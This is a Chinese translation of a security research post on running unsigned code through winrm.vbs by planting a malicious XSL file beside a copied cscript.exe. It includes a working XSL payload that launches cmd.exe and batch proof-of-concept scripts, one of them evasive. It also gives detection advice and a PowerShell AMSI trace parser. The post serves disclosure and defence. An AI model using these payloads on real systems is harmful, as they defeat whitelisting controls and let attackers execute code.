![如何使用 winrm.vbs
绕过应用白名单执行任意未签名代码](https://image.3001.net/images/20180722/15322391883730.png!small)

**严正声明：本文仅限于技术探讨，严禁用于其他用途。**

## 绕过技术

**winrm.vbs（System31中的一个Windows签名脚本）能够执行攻击者控制的XSL，它不会受到[相关脚本主机](https://bugs.chromium.org/p/project-zero/issues/detail?id=1514)的限制，并实现任意无符号代码执行。**

当你向winrm.vbs提供“-format:pretty”或“-format:text”时，它会从cscript.exe所在的目录中相应地导出WsmPty.xsl或WsmTxt.xsl。这也就意味着，如果攻击者能够将cscript.exe拷贝到一个他能控制的且存储了恶意XSL的位置，他们就能够执行任意未签名的代码。实际上，这个问题跟[Casey
Smith](https://twitter.com/subTee)的[wmic.exe技术](https://subt0x11.blogspot.com/2018/04/wmicexe-whitelisting-bypass-hacking.html)完全相同。

## PoC

攻击操作机制如下：

> 1． 将WsmPty.xsl或WsmTxt.xsl存放到一个由攻击者控制的地方；
>
> 2． 将cscript.exe拷贝到同一个位置；
>
> 3． 通过“-format”指定”pretty”或“text”来执行winrm.vbs，具体取决于使用的是WsmPty.xsl或WsmTxt.xsl。

下面给出的是一个恶意XLS样本，我们需要将它放到攻击者控制的目录位置，这里选择的是C:\BypassDir\WsmPty.xsl：

    
    
    <?xmlversion='1.0'?>
    <stylesheet
    xmlns="http://www.w3.org/1999/XSL/Transform"xmlns:ms="urn:schemas-microsoft-com:xslt"
    xmlns:user="placeholder"
    version="1.0">
    <outputmethod="text"/>
     <ms:scriptimplements-prefix="user" language="JScript">
     <![CDATA[
     var r = newActiveXObject("WScript.Shell").Run("cmd.exe");
     ]]> </ms:script>
    </stylesheet>

其实我们还可以在WsmPty.xsl中嵌入恶意的[DotNetToJScript
](https://github.com/tyranid/DotNetToJScript)
Payload，并执行任意未签名代码。接下来，可以使用下列batch文件来执行Payload：

    
    
    mkdir%SystemDrive%\BypassDir
    copy%windir%\System32\cscript.exe %SystemDrive%\BypassDir
    %SystemDrive%\BypassDir\cscript//nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4-format:pretty

## 检测和绕过策略

在实现这项技术的过程中，必须用到的就是攻击者可控的WsmPty.xsl或WsmTxt.xsl。

winrm.vbs会对WsmPty.xsl或WsmTxt.xsl进行硬编码，并显式地将它们绑定到“pretty”和“text”参数上。就此看来，我们似乎没有办法来控制winrm.vbs去执行当前目录中的不同xls文件。从检测的角度来看，WsmPty.xsl或WsmTxt.xsl文件的哈希会跟System
32中原本的文件哈希不同，因此它们会被当作可疑文件，因为合法xls文件的哈希值很少会发生变化。

除此之外，合法WsmPty.xsl或WsmTxt.xsl文件应该是目录签名的，哈希值发生变化后将不会再对其进行签名。也就是说，磁盘中任何没有签名的WsmPty.xsl或WsmTxt.xsl文件都应该是可疑文件。需要注意的是，目录签名验证需要运行“cryptsvc”服务。

基于命令行来检测winrm.vbs是否存在的这种方案相对较弱，因为攻击者可以将winrm.vbs重命名为他们所选择的文件。

为了使用xls文件，这里必须在“format”参数中指定“pretty”或“text”。下面给出的是支持的“format”参数（大小写不敏感）：

    
    
    -format:pretty
    -format:"pretty"
    /format:pretty
    /format:"pretty"
    -format:text
    -format:"text"
    /format:text
    /format:"text"

虽然构建基于“format”是否存在的检测方案能够捕捉到所有的变化，但这种检测方案是存在问题的。“format”参数是否合法使用将取决于组织所采用的方案。不过除了System32中的cscript.exe和winrm.vbs之外，不太可能从其他任何地方合法调用了。

下面给出的是一个更新版的.bat PoC，它能够绕过cscript.exe的检测：

    
    
    mkdir%SystemDrive%\BypassDir\cscript.exe
    copy%windir%\System32\wscript.exe %SystemDrive%\BypassDir\cscript.exe\winword.exe
    %SystemDrive%\BypassDir\cscript.exe\winword.exe//nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4-format:pretty

## WSH/XSLScript脚本

毫无疑问，攻击者还会继续使用XSL和WSH来进行攻击。理想情况下，攻击者是可以知道Payload到底是从硬盘中执行的还是完全在内存中执行的。虽然Powershell具有这种使用scriptblock日志的能力，但针对WSH却没有相应的工具。随着反恶意软件扫描接口（AMSI）的引入，我们将能够捕捉到WSH内容。

这里我们可以使用logman.exe来对ETL事件进行跟踪，比如说下列命令将能够控制ETW的跟踪操作，并将跟AMSI相关的事件信息保存早AMSITrace.etl之中：

    
    
    logman start AMSITrace -p Microsoft-Antimalware-Scan-Interface Event1 -o AMSITrace.etl-ets
    <Afterstarting the trace, this is when you'd run your malicious code to capture itscontext.>
    logmanstop AMSITrace -ets

接下来，我们还可以通过输出数据清单来了解更多事件信息：

    
    
    <instrumentation Manifestxmlns="http://schemas.microsoft.com/win/2004/08/events">
     <instrumentation xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"xmlns:win="http://manifests.microsoft.com/win/2004/08/windows/events">
      <events>
       <provider name="Microsoft-Antimalware-Scan-Interface"guid="{2a576b87-09a7-520e-c21a-4942f0271d67}"resourceFileName="Microsoft-Antimalware-Scan-Interface"messageFileName="Microsoft-Antimalware-Scan-Interface"symbol="MicrosoftAntimalwareScanInterface" source="Xml">
        <keywords>
         <keyword name="Event1"message="$(string.keyword_Event1)" mask="0x1"/>
        </keywords>
        <tasks>
         <task name="task_0"message="$(string.task_task_0)" value="0"/>
        </tasks>
        <events>
         <event value="1101"symbol="task_0" version="0" task="task_0"level="win:Informational" keywords="Event1"template="task_0Args"/>
        </events>
        <templates>
         <templatetid="task_0Args">
          <data name="session"inType="win:Pointer"/>
          <data name="scanStatus"inType="win:UInt8"/>
          <data name="scanResult"inType="win:UInt32"/>
          <data name="appname"inType="win:UnicodeString"/>
          <data name="contentname"inType="win:UnicodeString"/>
          <data name="contentsize"inType="win:UInt32"/>
          <data name="originalsize"inType="win:UInt32"/>
          <data name="content"inType="win:Binary" length="contentsize"/>
          <data name="hash" inType="win:Binary"/>
          <data name="contentFiltered"inType="win:Boolean"/>
         </template>
        </templates>
       </provider>
      </events>
     </instrumentation>
     <localization>
      <resources culture="en-US">
       <stringTable>
        <string id="keyword_Event1"value="Event1"/>
        <string id="task_task_0"value="task_0"/>
       </stringTable>
      </resources>
     </localization>
    </instrumentation Manifest>

捕捉到.etl跟踪信息之后，我们可以选择自己喜欢的工具来对其进行分析。Powershell中的Gt-WinEvent就是一个很好的内置.etl解析器。为此，我自己编写了一个简单的脚本来分析AMSI事件，这个脚本还可以捕捉到PowerShell中的内容：

    
    
    #Script author: Matt Graeber (@mattifestation)
    #logman start AMSITrace -p Microsoft-Antimalware-Scan-Interface Event1 -oAMSITrace.etl -ets
    # Doyour malicious things here that would be logged by AMSI
    #logman stop AMSITrace -ets
     
    $OSArchProperty= Get-CimInstance -ClassName Win32_OperatingSystem -Property OSArchitecture
    $OSArch= $OSArchProperty.OSArchitecture
     
    $OSPointerSize= 32
    if($OSArch -eq '64-bit') { $OSPointerSize = 64 }
     
    $AMSIScanEvents= Get-WinEvent -Path .\AMSITrace.etl -Oldest -FilterXPath'*[System[EventID=1101]]' | ForEach-Object {
        if(-not $_.Properties) {
            # The AMSI provider is not supplyingthe contentname property when WSH content is logged resulting
            # in Get-WinEvent or Event Viewer beingunable to parse the data based on the schema.
            # If this bug were not present,retrieving WSH content would be trivial.
     
            $PayloadString = ([Xml]$_.ToXml()).Event.ProcessingErrorData.EventPayload
            [Byte[]] $PayloadBytes =($PayloadString -split '([0-9A-F]{2})' | Where-Object {$_} | ForEach-Object{[Byte] "0x$_"})
     
            $MemoryStream = New-Object -TypeNameIO.MemoryStream -ArgumentList @(,$PayloadBytes)
            $BinaryReader = New-Object -TypeNameIO.BinaryReader -ArgumentList $MemoryStream, ([Text.Encoding]::Unicode)
     
            switch ($OSPointerSize) {
                32 { $Session =$BinaryReader.ReadUInt32() }
                64 { $Session =$BinaryReader.ReadUInt64() }
            }
     
            $ScanStatus = $BinaryReader.ReadByte()
            $ScanResult = $BinaryReader.ReadInt32()
     
            $StringBuilder = New-Object -TypeNameText.StringBuilder
            do { $CharVal =$BinaryReader.ReadInt16(); $null = $StringBuilder.Append([Char] $CharVal) }while ($CharVal -ne 0)
            $AppName = $StringBuilder.ToString()
            $null = $StringBuilder.Clear()
     
            $ContentSize =$BinaryReader.ReadInt32()
            $OriginalSize =$BinaryReader.ReadInt32()
            $ContentRaw =$BinaryReader.ReadBytes($ContentSize)
            $Content =[Text.Encoding]::Unicode.GetString($ContentRaw)
            $Hash =[BitConverter]::ToString($BinaryReader.ReadBytes(0x20)).Replace('-', '')
            [Bool] $ContentFiltered =$BinaryReader.ReadInt32()
     
            $BinaryReader.Close()
     
            [PSCustomObject] @{
                Session = $Session
                ScanStatus = $ScanStatus
                ScanResult = $ScanResult
                AppName = $AppName
                ContentName = $null
                Content = $Content
                Hash = $Hash
                ContentFiltered = $ContentFiltered
            }
        } else {
            $Session = $_.Properties[0].Value
            $ScanStatus = $_.Properties[1].Value
            $ScanResult = $_.Properties[2].Value
            $AppName = $_.Properties[3].Value
            $ContentName = $_.Properties[4].Value
            $Content = [Text.Encoding]::Unicode.GetString($_.Properties[7].Value)
            $Hash =[BitConverter]::ToString($_.Properties[8].Value).Replace('-', '')
            $ContentFiltered =$_.Properties[9].Value
     
            [PSCustomObject] @{
                Session = $Session
                ScanStatus = $ScanStatus
                ScanResult = $ScanResult
                AppName = $AppName
                ContentName = $ContentName
                Content = $Content
                Hash = $Hash
                ContentFiltered = $ContentFiltered
            }
        }
    }
     
    $AMSIScanEvents

捕捉到相关信息之后，我们将能够看到Payload的执行内容：

![如何使用 winrm.vbs
绕过应用白名单执行任意未签名代码](https://image.3001.net/images/20180722/15322392822460.png!small)

## 后话

我们清楚这项技术一旦公开之后，很多攻击者便会加快针对这种技术变种的开发，这也就是为什么
**在公布一种攻击技术之前，我们需要将其上报给相关厂商，并给他们留下充足的时间来解决相关问题，以确保更新能够及时交付给客户。**

 *** 参考来源：[specterops](https://posts.specterops.io/application-whitelisting-bypass-and-arbitrary-unsigned-code-execution-technique-in-winrm-vbs-c8c24fb40404)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM。**

